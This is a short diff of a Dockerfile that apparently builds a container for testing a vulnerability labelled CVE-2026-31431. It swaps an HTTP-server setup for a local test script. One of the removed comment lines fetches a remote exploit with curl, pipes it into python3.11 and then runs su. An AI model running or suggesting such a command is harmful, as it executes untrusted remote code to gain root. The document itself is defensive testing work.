@@ -4,17 +4,8 @@ FROM ${IMAGE_NAME}
 # hadolint ignore=DL3002
 USER 0
 
-RUN dnf install -y python3.11
+COPY test-cve-2026-31431.py /usr/local/bin
 
 USER 1001
 
-WORKDIR /tmp
-
-EXPOSE 8000
-CMD ["python3", "-m", "http.server", "8000"]
-
-# podman build -t copy-fail .
-# podman run -d --rm --name copy-fail --replace copy-fail
-# podman exec -it copy-fail /bin/bash
-
-# curl https://copy.fail/exp | python3.11 && su
+CMD ["python3", "/usr/local/bin/test-cve-2026-31431.py"]
